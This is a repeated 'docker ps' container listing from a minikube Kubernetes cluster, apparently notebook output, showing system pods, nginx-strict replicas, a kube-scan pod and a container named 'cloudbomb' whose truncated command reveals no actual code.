      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago          Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago          Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago          Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago          Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED              STATUS              PORTS               NAMES\n",
      "24071c9d6ae1        k8s.gcr.io/pause:3.5          \"/pause\"                 12 seconds ago       Up 11 seconds                           k8s_POD_kube-scan-db6ffdfd5-qdt94_kube-scan_0f0a7470-c89c-405a-a6f6-9775db49a20a_0\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   About a minute ago   Up About a minute                       k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 About a minute ago   Up About a minute                       k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago       Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago       Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago       Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago       Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago       Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago       Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago          Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago          Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago          Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago          Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago          Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago          Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago          Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED              STATUS              PORTS               NAMES\n",
      "24071c9d6ae1        k8s.gcr.io/pause:3.5          \"/pause\"                 22 seconds ago       Up 21 seconds                           k8s_POD_kube-scan-db6ffdfd5-qdt94_kube-scan_0f0a7470-c89c-405a-a6f6-9775db49a20a_0\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   About a minute ago   Up About a minute                       k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 About a minute ago   Up About a minute                       k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago       Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago       Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago       Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago       Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago       Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago       Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago          Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago          Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago          Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago          Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago          Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago          Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago          Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS               NAMES\n",
      "24071c9d6ae1        k8s.gcr.io/pause:3.5          \"/pause\"                 32 seconds ago      Up 31 seconds                           k8s_POD_kube-scan-db6ffdfd5-qdt94_kube-scan_0f0a7470-c89c-405a-a6f6-9775db49a20a_0\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   2 minutes ago       Up 2 minutes                            k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 2 minutes ago       Up 2 minutes                            k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago      Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago      Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago      Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago      Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago      Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago      Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago         Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago         Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago         Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago         Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago         Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago         Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago         Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS               NAMES\n",
      "24071c9d6ae1        k8s.gcr.io/pause:3.5          \"/pause\"                 42 seconds ago      Up 41 seconds                           k8s_POD_kube-scan-db6ffdfd5-qdt94_kube-scan_0f0a7470-c89c-405a-a6f6-9775db49a20a_0\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   2 minutes ago       Up 2 minutes                            k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 2 minutes ago       Up 2 minutes                            k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago      Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago      Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago      Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago      Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago      Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago      Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago         Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago         Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago         Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago         Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago         Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago         Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago         Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS               NAMES\n",
      "24071c9d6ae1        k8s.gcr.io/pause:3.5          \"/pause\"                 52 seconds ago      Up 51 seconds                           k8s_POD_kube-scan-db6ffdfd5-qdt94_kube-scan_0f0a7470-c89c-405a-a6f6-9775db49a20a_0\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   2 minutes ago       Up 2 minutes                            k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 2 minutes ago       Up 2 minutes                            k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago      Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago      Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago      Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago      Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago      Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago      Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago         Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago         Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago         Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago         Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago         Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago         Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago         Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED              STATUS              PORTS               NAMES\n",
      "24071c9d6ae1        k8s.gcr.io/pause:3.5          \"/pause\"                 About a minute ago   Up About a minute                       k8s_POD_kube-scan-db6ffdfd5-qdt94_kube-scan_0f0a7470-c89c-405a-a6f6-9775db49a20a_0\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   2 minutes ago        Up 2 minutes                            k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 2 minutes ago        Up 2 minutes                            k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago       Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
